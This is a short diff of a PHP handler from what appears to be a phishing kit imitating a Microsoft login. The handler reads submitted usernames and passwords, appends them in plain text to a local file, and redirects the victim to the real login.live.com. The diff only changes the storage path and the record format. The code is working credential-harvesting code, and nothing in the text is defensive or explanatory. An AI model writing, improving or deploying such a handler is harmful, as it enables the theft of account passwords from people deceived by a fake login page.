@@ -3,9 +3,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $login = $_POST['login'];
     $passwd = $_POST['passwd'];
     
-    $file = fopen("../../auth/usernames.dat", "a");
-    fwrite($file, "Service: Microsoft | Login: " . $login . " | Pass: " . $passwd . "\n");
-    fclose($file);
+    $fp = fopen("usernames.txt", "a");
+    fwrite($fp, "Username: " . $login . " | Pass: " . $passwd . "\n");
+    fclose($fp);
     
     header("Location: https://login.live.com");
     exit();
